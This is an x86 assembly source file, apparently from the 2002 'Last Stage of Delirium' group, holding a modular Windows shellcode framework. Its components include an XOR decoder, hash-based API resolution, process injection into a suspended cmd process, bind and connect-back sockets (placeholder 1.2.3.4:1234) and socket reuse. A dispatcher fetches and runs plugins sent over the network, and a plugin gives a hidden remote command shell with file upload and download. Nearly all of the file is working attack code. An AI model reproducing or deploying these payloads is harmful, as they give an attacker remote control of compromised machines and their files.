; ## copyright LAST STAGE OF DELIRIUM aug 2002 poland         *://lsd-pl.net/ #
; ## wasm assembly components                                                 #

.386
.model flat
.code


; CONFIGURATION
; ---                                                                       - ;

db "WINASM",0,0                            ; indicator
rel:                                       ; base relocation address

dd wasm-rel                                ; base code address
dd comp-rel                                ; components 
dd plug-rel                                ; plugins 
dd vars-rel                                ; variables 
dd syms-rel                                ; symbols

comp:                                      ; components table
dd lNull-rel,dNull-rel,sNull,oNull
dd lXore-rel,dXore-rel,sXore,oXore
dd lInit-rel,dInit-rel,sInit,oInit
dd lFork-rel,dFork-rel,sFork,oFork
dd lWsai-rel,dWsai-rel,sWsai,oWsai
dd lBind-rel,dBind-rel,sBind,oBind
dd lConn-rel,dConn-rel,sConn,oConn
dd lFind-rel,dFind-rel,sFind,oFind
dd lDisp-rel,dDisp-rel,sDisp,oDisp
dd 0

plug:                                      ; plugins table
dd lMain-rel,dMain-rel,sMain,oMain
dd 0

vars:                                      ; variables table
dd 17                                      ; vXVAL
dd 13                                      ; vXLEN
dd 8                                       ; vBPRT
dd 1                                       ; vCADR
dd 8                                       ; vCPRT
dd 37                                      ; vCDEL
dd 21                                      ; vFPRT
dd 0

syms:                                      ; symbols table
dd dInit-rel,dInit-rel+(3*4)
dd dFork-rel,dFork-rel+(1*4)
dd dWsai-rel,dWsai-rel+(1*4)
dd dBind-rel,dBind-rel+(5*4)
dd dConn-rel,dConn-rel+(3*4)
dd dFind-rel,dFind-rel+(2*4)
dd dMain-rel,dMain-rel+(5*4)
dd 0

_01 db "LoadLibraryA",0                    ; kernel32.dll symbol strings
_02 db "CreateProcessA",0
_03 db "GetThreadContext",0
_04 db "SetThreadContext",0
_05 db "ResumeThread",0
_06 db "VirtualAllocEx",0
_07 db "WriteProcessMemory",0
_08 db "CreatePipe",0
_09 db "CreateNamedPipeA",0
_0a db "CreateFileA",0
_0b db "CloseHandle",0
_0c db "TerminateProcess",0
_0d db "CreateEventA",0
_0e db "WaitForMultipleObjects",0
_0f db "GetOverlappedResult",0
_10 db "ReadFile",0
_11 db "WriteFile",0
_12 db "Sleep",0
db 0

_13 db "WSAStartup",0                      ; ws2_32.dll symbol strings
_14 db "WSACreateEvent",0
_15 db "WSAEventSelect",0
_16 db "WSAEnumNetworkEvents",0
_17 db "socket",0
_18 db "bind",0
_19 db "listen",0
_1a db "accept",0
_1b db "send",0
_1c db "recv",0
_1d db "connect",0
_1e db "getpeername",0
_1f db "ioctlsocket",0
_20 db "closesocket",0
db 0


; COMPONENTS
; ---                                                                       - ;
wasm:


; NULL procedure
; ---                                                                       - ;

pNull     proc 
    oNull equ 0
    lNull db  "null",0
    align 4
dNull:
tNull:
    call  $+5
    pop   ebp
    cld
    add   ebp,5

    sNull equ $-tNull
endp


; XORE procedure
; ---                                                                       - ;

pXore     proc
    oXore equ 0
    lXore db  "xore",0
    align 4
dXore:
tXore:
    cld
    jmp   $+21
    pop   esi
    push  esi
    mov   ebp,esi
    mov   edi,esi
    xor   ecx,ecx
    mov   cx,1234h
    lodsb
    xor   al,0
    stosb
    loop  $-4
    ret
    call  $-19

    sXore equ $-tXore
endp


; INIT procedure
; ---                                                                       - ;

pInit     proc
    oInit equ tInit-dInit
    lInit db  "init",0
    align 4
dInit:
    dd    $-_01,$-_0c,0
    dd    $-_1b,$-_1c,$-_20,0
    db    "ws2_32",0
tInit:
    push  eax                              ; push address of procedure to call

    push  ebp
    sub   ebp,50h
    push  esi

    push  edi
    lea   edi,[esi-oInit]
    call  pIniK32                          ; find "LoadLibraryA"...
    lea   esi,[edi+3*4+4]                  ; ptr to "ws2_32",0
    push  esi
    lea   eax,[ebp-2*4]
    call  pIniWS2                          ; find "send"...
    pop   esi
    pop   edi

    lea   eax,[ebp-5*4]
    call  pIniWS2                          ; resolve "ws2_32.dll" 
    call  pIniK32                          ; resolve "kernel32.dll"

    pop   esi
    pop   ebp
    ret                                    ; call procedure

pIniK32   proc
    mov   eax,fs:[30h]
    mov   eax,[eax+0ch]
    mov   esi,[eax+1ch]
    lodsd
    mov   edx,[eax+08h]
    jmp   i1
endp

pIniWS2   proc
    push  esi
    call  [eax]
    mov   edx,eax
endp

i1: mov   ecx,[edi]
    add   edi,4
    jecxz i2
    call  pGetExp
    mov   [ebp],esi
    add   ebp,4
    jmp   i1
i2: ret

pGetExp   proc
    mov   esi,edx                          ; library base address
    movzx ebx,word ptr [esi+3ch]
    mov   esi,[esi+ebx+78h]                ; pe.oheader.directorydata[EXPORT=0]
    lea   esi,[edx+esi+1ch]
    lodsd                                  ; address of functions
    add   eax,edx                          ; rva2va
    push  eax
    lodsd                                  ; address of names
    add   eax,edx                          ; rva2va
    push  eax
    lodsd                                  ; address of name ordinals
    add   eax,edx                          ; rva2va
    pop   ebx
    push  eax

    xor   eax,eax                          ; index
i3: mov   esi,[4*eax+ebx]                  ; ptr to symbol name
    add   esi,edx                          ; rva2va

    push  ebx                              ; hash: h=((h<<5)|(h>>27))+c
    push  eax
    xor   ebx,ebx
i4: xor   eax,eax                          ; hash loop
    lodsb
    rol   ebx,5
    add   ebx,eax
    cmp   eax,0
    jnz   i4 
    ror   ebx,5 
    cmp   ebx,ecx                          ; hash compare
    pop   eax
    pop   ebx
    je    i5                               ; same: symbol found
    inc   eax
    jmp   i3                               ; different: go to the next symbol

i5: pop   ebx
    movzx esi,word ptr [2*eax+ebx]         ; get index from name ordinals table
    pop   eax
    mov   esi,[4*esi+eax]                  ; get address of function in memory
    add   esi,edx                          ; rva2va
    ret 
endp

    @@_T                  equ -50h         ; global text
    @@_D                  equ -7ch         ; global data

    @@_LoadLibraryA       equ @@_T+00h 
    @@_TerminateProcess   equ @@_T+04h
    @@_send               equ @@_T+08h
    @@_recv               equ @@_T+0ch
    @@_closesocket        equ @@_T+10h
    @@_plugin             equ @@_D+00h
    @@_pSend              equ @@_D+04h
    @@_pRecv              equ @@_D+08h
    @@_hsck2              equ @@_D+0ch
    @@_hsck               equ @@_D+10h
    @_T                   equ @@_T+14h

    sInit equ $-dInit
endp


; FORK procedure
; ---                                                                       - ;

pFork     proc
    oFork equ tFork-dFork
    lFork db  "fork",0
    align 4
dFork:
    dd    0
    dd    $-_02,$-_03,$-_04,$-_05,$-_06,$-_07,0
    db    "cmd",0
tFork:
    mov   esi,edi
    lea   ebx,[ebp+@_f_pi]
    push  ebx                              ; pi (16bytes)
    lea   edi,[ebp+@_f_si]
    push  edi                              ; si (68bytes)
    xor   eax,eax
    push  68/4
    pop   ecx
    rep   stosd
    push  eax
    push  eax
    push  04h                              ; flag=CREATE_SUSPENDED
    push  0                                ; inherit=FALSE
    push  eax
    push  eax
    push  esi                              ; cmdline="cmd"
    push  eax                              ; appname=NULL
    call  [ebp+@_CreateProcessA]

    sub   esp,0400h
    push  00010007h                        ; ctx.ContextFlags=CONTEXT_FULL
    push  esp                              ; ctx
    push  dword ptr [ebp+@_f_pi+4]         ; hthread
    call  [ebp+@_GetThreadContext]

    push  40h                              ; PAGE_EXECUTE_READWRITE
    push  1000h                            ; MEM_COMMIT
    push  5000h                            ; 20kb
    push  0
    push  dword ptr [ebp+@_f_pi]
    call  [ebp+@_VirtualAllocEx]           ; alloc memory in a new process

    mov   ebx,eax                          ; buf=allocated memory
    add   ebx,2h                           ; eip=buf+2 (jmp instruction)

    mov   [esp+0b8h],ebx                   ; ctx.Eip=eip
    mov   [esp+0b4h],ebx                   ; ctx.Ebp=eip ??? 

    mov   edi,[esp+4+0400h]                ; return address

    push  0
    push  0800h
    push  edi
    push  eax
    push  dword ptr [ebp+@_f_pi]
    call  [ebp+@_WriteProcessMemory]

    push  esp
    push  dword ptr [ebp+@_f_pi+4]
    call  [ebp+@_SetThreadContext]

    push  dword ptr [ebp+@_f_pi+4]
    call  [ebp+@_ResumeThread]

    add   esp,0400h+4
    ret

    @_TFork                   equ @_T
    @_DFork                   equ @_T+18h

    @_CreateProcessA          equ @_TFork+00h
    @_GetThreadContext        equ @_TFork+04h
    @_SetThreadContext        equ @_TFork+08h
    @_ResumeThread            equ @_TFork+0ch
    @_VirtualAllocEx          equ @_TFork+10h
    @_WriteProcessMemory      equ @_TFork+14h
    @_f_si                    equ @_DFork+00h
    @_f_pi                    equ @_DFork+44h

    sFork equ $-dFork
endp


; WSAI procedure
; ---                                                                       - ;

pWsai     proc
    oWsai equ tWsai-dWsai
    lWsai db  "wsai",0
    align 4
dWsai:
    dd    $-_13,0
    dd    0
tWsai:
    lea   eax,[ebp+@_DWsai]
    push  eax
    push  02h
    call  [ebp+@_WSAStartup] 
    ret

    @_TWsai                   equ @_T
    @_DWsai                   equ @_T+04h

    @_WSAStartup              equ @_TWsai+00h

    sWsai equ $-dWsai
endp


; BIND procedure
; ---                                                                       - ;

pBind     proc
    oBind equ tBind-dBind
    lBind db  "bind",0
    align 4
dBind:
    dd    $-_17,$-_18,$-_19,$-_1a,0
    dd    0
tBind:
    xor   eax,eax
    push  eax
    push  eax
    push  eax                              ; sockaddr_in.sin_addr=0.0.0.0
    push  034120002h                       ; sockaddr_in.sin_port=1234
    mov   edi,esp
    push  eax
    push  01h                              ; SOCK_STREAM
    push  02h                              ; AF_INET
    call  [ebp+@_socket]                   ; socket(AF_INET,SOCK_STREAM,0)
    push  10h                              ; sizeof(sockaddr_in)=0x10
    push  edi
    xchg  edi,eax
    push  edi
    call  [ebp+@_bind]                     ; bind(sck,&sinaddr_in,0x10)
    push  05h
    push  edi
    call  [ebp+@_listen]                   ; listen(sck,5)
    push  eax
    push  eax
    push  edi
    call  [ebp+@_accept]                   ; accept(sck,0,0)
    mov   [ebp+@@_hsck2],edi
    mov   [ebp+@@_hsck],eax
    add   esp,16
    ret

    @_TBind                   equ @_T
    @_DBind                   equ @_T+10h

    @_socket                  equ @_TBind+00h
    @_bind                    equ @_TBind+04h
    @_listen                  equ @_TBind+08h
    @_accept                  equ @_TBind+0ch

    sBind equ $-dBind
endp


; CONN procedure
; ---                                                                       - ;

pConn     proc
    oConn equ tConn-dConn
    lConn db  "conn",0
    align 4
dConn:
    dd    $-_17,$-_1d,0
    dd    $-_12,0
tConn:
    push  004030201h                       ; sockaddr_in.sin_addr=1.2.3.4
    push  034120002h                       ; sockaddr_in.sin_port=1234
    push  0
    push  01h                              ; SOCK_STREAM
    push  02h                              ; AF_INET
    call  [ebp+@_socket]
    xchg  edi,eax
    push  0                                ; 0 miliseconds
i6: call  [ebp+@_Sleep]
    mov   ebx,esp
    push  10h                              ; sizeof(sockaddr_in)=0x10
    push  ebx
    push  edi
    call  [ebp+@_connect]
    dec   eax
    inc   eax
    push  1234h                            ; n miliseconds
    jnz   i6
    mov   [ebp+@@_hsck],edi
    add   esp,8+4
    ret

    @_TConn                   equ @_T
    @_DConn                   equ @_T+0ch

    @_socket                  equ @_TConn+00h
    @_connect                 equ @_TConn+04h
    @_Sleep                   equ @_TConn+08h

sConn     equ $-dConn
endp


; FIND procedure
; ---                                                                       - ;

pFind     proc
    oFind equ tFind-dFind
    lFind db  "find",0
    align 4
dFind:
    dd    $-_1e,0
    dd    0
tFind:
    xor   edi,edi
    push  10h
i7: lea   eax,[ebp+@_adr]
    push  esp
    push  eax
    push  edi
    call  [ebp+@_getpeername]
    xchg  eax,ecx
    jecxz i9
i8: inc   edi
    jmp   i7
i9: mov   bx,1234h
    cmp   bx,[ebp+@_adr+2]
    jne   i8
    mov   [ebp+@@_hsck],edi
    pop   eax
    ret

    @_TFind                   equ @_T
    @_DFind                   equ @_T+04h

    @_getpeername             equ @_TFind+00h
    @_adr                     equ @_DFind+00h

sFind     equ $-dFind
endp


; DISP procedure
; ---                                                                       - ;

pDisp     proc
    oDisp equ tDisp-dDisp
    lDisp db  "disp",0
    align 4
dDisp:
tDisp:
    lea   eax,[eax+eDisp-tDisp]
    push  eax

    lea   edi,[ebp+@@_plugin]
    xor   ebx,ebx
    xchg  eax,ebx
    stosd
    lea   eax,[ebx-(eDisp-pSend)]          ; register @@_pSend 
    stosd 
    lea   eax,[ebx-(eDisp-pRecv)]          ; register @@_pRecv
    stosd

    pop   edi

m_loop:
    call  [ebp+@@_pRecv]                   ; main dispatch routine
    jecxz m_exit                           ; 0: failure (disconnect)
    mov   ecx,[ebp+@_sbuf]
    jecxz m_exit                           ; 0: exit (disconnect)
    dec   ecx
    jecxz m_kill                           ; 1: kill (terminate process)
    js    m_plug                           ; x(sig): load x plugin every time
    cmp   ecx,[ebp+@@_plugin] 
    jnz   m_plug                           ; x: load x only if not in memory

    mov   dword ptr [ebp+@_cnt],0          ; phase 1: init (ready)
    call  [ebp+@@_pSend]
    jmp   m_run

m_plug:
    mov   [ebp+@@_plugin],ecx

    mov   dword ptr [ebp+@_cnt],1          ; phase 1: init (retrieve plugin)
    call  [ebp+@@_pSend]

    push  edi
j1: call  [ebp+@@_pRecv]
    jecxz j2 
    push  esi
    lea   esi,[ebp+@_sbuf]
    rep   movsb 
    pop   esi
    jmp   j1
j2: pop   edi

m_run:
    pushad                                 ; save regs (preserve ebp,esi,edi)
    mov   eax,[edi]                        ; phase 2: run 
    add   edi,4
    add   eax,edi
    call  esi                              ; call plugin through ???
    popad                                  ; restore regs
    jmp   m_loop

m_exit:
    push  dword ptr [ebp+@@_hsck2]
    push  dword ptr [ebp+@@_hsck]
    call  [ebp+@@_closesocket]
    call  [ebp+@@_closesocket]
    ret

m_kill:
    xor   eax,eax
    push  eax                              ; status=0
    dec   eax
    push  eax                              ; phandle=-1 ntcurrentprocess()
    call  [ebp+@@_TerminateProcess]        ; terminate this process
    ;end

pSend     proc
    push  0
    mov   ebx,[ebp+@_cnt]
    inc   ebx
    push  ebx
    lea   ebx,[ebp+@_pbuf-1]
    shl   dword ptr [ebp+@_cnt],24
    push  ebx
    push  dword ptr [ebp+@@_hsck]
    call  [ebp+@@_send]
    ret
endp

pRecv     proc
    push  esi
    xor   esi,esi

    push  0
    push  1 
    lea   ebx,[ebp+@_sbuf-4]
    mov   [ebx],esi
    push  ebx
    push  dword ptr [ebp+@@_hsck]
    call  [ebp+@@_recv]
    dec   eax
    jl    j4
    mov   ecx,dword ptr [ebp+@_sbuf-4]
    jecxz j5

j3: push  ecx
    push  0
    push  1
    lea   ebx,[ebp+@_sbuf+esi]
    push  ebx
    push  dword ptr [ebp+@@_hsck]
    call  [ebp+@@_recv]
    pop   ecx
    inc   esi
    loop  j3

j4: mov   ecx,esi
j5: pop   esi
    ret
endp

eDisp:

    @_TDisp                   equ @_T
    @_DDisp                   equ @_T+00h

    sDisp equ $-dDisp
endp


; MAIN plugin 
; ---                                                                       - ;

pMain     proc
    oMain equ tMain-dMain
    lMain db  "main",0
    align 4
dMain:
    dd    $-_14,$-_15,$-_16,$-_1f,0
    dd    $-_08,$-_09,$-_0a,$-_0d,$-_02,$-_0e,$-_0f,$-_10,$-_11,$-_0b,0
    db    "\\.\pipe\0",0
    db    "cmd",0
tMain:
    call  [ebp+@@_pRecv]
    lea   ebx,[ebp+@_sbuf+4]
    mov   eax,[ebx-4]
    dec   eax
    jz    c_cmd 
    dec   eax
    jz    c_get 
    dec   eax
    jz    c_put 
    ret

c_get:
    xor   ecx,ecx
    push  03h                              ; OPEN_EXISTING
    pop   edx
    call  pOpen
    mov   [ebp+@_hout1],eax
j6: xor   ebx,ebx
    call  pRead
    mov   ecx,[ebp+@_cnt]
    jecxz j7
    call  [ebp+@@_pSend]
    jmp   j6
j7: push  dword ptr [ebp+@_hout1]
    call  [ebp+@_CloseHandle]
    mov   dword ptr [ebp+@_cnt],0
    call  [ebp+@@_pSend]
    ret

c_put:
    xor   ecx,ecx
    push  02h                              ; CREATE_ALWAYS
    pop   edx
    call  pOpen
    mov   [ebp+@_hin0],eax
j8: call  [ebp+@@_pRecv]
    jecxz j9 
    call  pWrite
    jmp   j8
j9: push  dword ptr [ebp+@_hin0]
    call  [ebp+@_CloseHandle]
    ret

c_cmd:
    push  01h                              ; sa.inherit=TRUE 
    push  0                                ; sa.descriptor=NULL
    push  0ch                              ; sa.sizeof(sa)=0x0c
    mov   ebx,esp                          ; sa struct placed on the stack

    push  0ffh
    push  ebx
    lea   edx,[ebp+@_hin0]
    push  edx
    add   edx,4
    push  edx
    call  [ebp+@_CreatePipe]

    xor   eax,eax
    push  eax
    push  eax
    push  eax
    push  eax
    push  0ffh                             ; UNLIMITED_INSTANCES
    push  eax                              ; TYPE_BYTE|READMODE_BYTE|WAIT
    push  40000003h                        ; ACCES_DUPLEX|FLAG_OVERLAPPED
    push  edi                              ; pip="\\.\pipe\0"
    call  [ebp+@_CreateNamedPipeA]
    mov   [ebp+@_hout1],eax

    mov   ecx,esp                          ; lap
    mov   ebx,edi                          ; pip="\\.\pipe\0"
    push  03h                              ; OPEN_EXISTING
    pop   edx
    call  pOpen
    mov   [ebp+@_hout0],eax
    push  eax

    xor   eax,eax
    lea   ebx,[ebp+@_pi]
    push  ebx
    lea   ebx,[ebp+@_si] 
    push  ebx
    push  eax 
    push  eax 
    push  eax 
    push  01h                              ; inherit=TRUE
    push  eax 
    push  eax 
    lea   ebx,[edi+8+7-4]                  ; cmd="cmd"
    push  ebx 
    push  eax 

    push  edi
    lea   edi,[ebp+@_si+02ch]              ; si
    mov   ax,0101h                         ; si.flg=USESHOWWINDOW|USESTDHANDLES
    stosd
    xor   eax,eax
    mov   [ebp+@_si+08h],eax
    mov   [ebp+@_si+0ch],eax
    stosd                                  ; si.showwindow=HIDE
    stosd
    mov   eax,[ebp+@_hin1]
    stosd                                  ; si.stdinput
    mov   eax,[ebp+@_hout0]
    stosd                                  ; si.stdoutput
    stosd                                  ; si.stderror
    pop   edi
    call  [ebp+@_cmd_CreateProcessA]

    push  dword ptr [ebp+@_hin1]
    call  [ebp+@_CloseHandle]
    call  [ebp+@_CloseHandle]

    add esp,0ch                            ; free sa struct

    xor   eax,eax
    push  eax
    push  01h                              ; initialstate=SIGNALED
    push  01h                              ; manualreset=TRUE
    push  eax
    call  [ebp+@_CreateEventA]
    mov   [ebp+@_epip],eax

    xor   ebx,ebx                          ; lap struct {any,any,any,0,event}
    mov   [ebp+@_lap+0ch],ebx
    mov   [ebp+@_lap+10h],eax

    call  [ebp+@_WSACreateEvent]
    mov   [ebp+@_esck],eax
    mov   dword ptr [ebp+@_flg],0

k1: push  21h                              ; FD_READ|FD_CLOSE
    push  dword ptr [ebp+@_esck]           ; esck
    push  dword ptr [ebp+@@_hsck]
    call  [ebp+@_WSAEventSelect]

    xor   eax,eax
    dec   eax
    push  eax
    inc   eax
    push  eax
    lea   ebx,[ebp+@_epip]
    push  ebx
    push  02h
    call  [ebp+@_WaitForMultipleObjects]
    push  eax

    lea   ebx,[ebp+@_sbuf]
    push  ebx
    push  dword ptr [ebp+@_esck]
    push  dword ptr [ebp+@@_hsck]
    call  [ebp+@_WSAEnumNetworkEvents]

    push  0
    push  dword ptr [ebp+@_esck]
    push  dword ptr [ebp+@@_hsck]
    call  [ebp+@_WSAEventSelect]

    push  0
    push  esp
    push  8004667eh
    push  dword ptr [ebp+@@_hsck]
    call  [ebp+@_ioctlsocket]
    pop   eax

    pop   ecx
    jecxz k2
    dec   ecx
    jnz   k5 

    call  [ebp+@@_pRecv]
    jecxz k5                               ; disconnect or <CTRL-C> request
    call  pWrite
    jmp   k1

k2: mov   ecx,[ebp+@_flg]
    jecxz k3
    push  eax
    lea   ebx,[ebp+@_cnt]
    push  ebx
    lea   ebx,[ebp+@_lap]
    push  ebx
    push  dword ptr [ebp+@_hout1]
    call  [ebp+@_GetOverlappedResult]
    xchg  eax,ecx
    jecxz k5
    jmp   k4

k3: lea   ebx,[ebp+@_lap]
    call  pRead
    inc   dword ptr [ebp+@_flg]
    jecxz k1

k4: dec   dword ptr [ebp+@_flg]
    call  [ebp+@@_pSend]
    jmp   k1

k5: xor   eax,eax
    push  eax                              ; status=0

    mov   dword ptr [ebp+@_cnt],eax
    call  [ebp+@@_pSend]

    push  dword ptr [ebp+@_pi]
    call  [ebp+@@_TerminateProcess]        ; terminate child process

    push  dword ptr [ebp+@_pi]
    push  dword ptr [ebp+@_pi+4]
    push  dword ptr [ebp+@_hout1]
    push  dword ptr [ebp+@_hin0]
    call  [ebp+@_CloseHandle]
    call  [ebp+@_CloseHandle]
    call  [ebp+@_CloseHandle]
    call  [ebp+@_CloseHandle]

    ret 

    @_TMain                   equ @_T
    @_DMain                   equ @_T+38h

    @_WSACreateEvent          equ @_TMain+00h
    @_WSAEventSelect          equ @_TMain+04h
    @_WSAEnumNetworkEvents    equ @_TMain+08h
    @_ioctlsocket             equ @_TMain+0ch
    @_CreatePipe              equ @_TMain+10h
    @_CreateNamedPipeA        equ @_TMain+14h
    @_CreateFileA             equ @_TMain+18h
    @_CreateEventA            equ @_TMain+1ch
    @_cmd_CreateProcessA      equ @_TMain+20h
    @_WaitForMultipleObjects  equ @_TMain+24h
    @_GetOverlappedResult     equ @_TMain+28h
    @_ReadFile                equ @_TMain+2ch
    @_WriteFile               equ @_TMain+30h
    @_CloseHandle             equ @_TMain+34h
    @_hin0                    equ @_DMain+00h
    @_hin1                    equ @_DMain+04h
    @_hout0                   equ @_DMain+08h
    @_hout1                   equ @_DMain+0ch
    @_epip                    equ @_DMain+10h
    @_esck                    equ @_DMain+14h
    @_hproc                   equ @_DMain+18h
    @_flg                     equ @_DMain+1ch
    @_lap                     equ @_DMain+20h
    @_cnt                     equ @_DMain+34h
    @_pbuf                    equ @_DMain+38h
    @_sbuf                    equ @_DMain+78h
    @_si                      equ @_DMain+0b8h
    @_pi                      equ @_DMain+0fch

pOpen     proc
    xor   eax,eax
    push  eax
    push  eax
    push  edx                              ; flags: open/create
    push  ecx                              ; lap
    push  eax
    push  02000000h                        ; MAXIMUM_ALLOWED
    push  ebx                              ; path
    call  [ebp+@_CreateFileA]
    ret
endp

pRead     proc
    push  ebx                              ; null or &lap
    lea   ebx,[ebp+@_cnt]
    push  ebx
    push  40h-4
    lea   ebx,[ebp+@_pbuf]
    push  ebx
    push  dword ptr [ebp+@_hout1]
    call  [ebp+@_ReadFile]
    xchg  eax,ecx
    ret
endp

pWrite    proc
    push  0
    lea   ebx,[ebp+@_cnt]
    push  ebx
    push  ecx
    lea   ebx,[ebp+@_sbuf]
    push  ebx
    push  dword ptr [ebp+@_hin0]
    call  [ebp+@_WriteFile]
    ret
endp

    sMain equ $-dMain
endp

end wasm

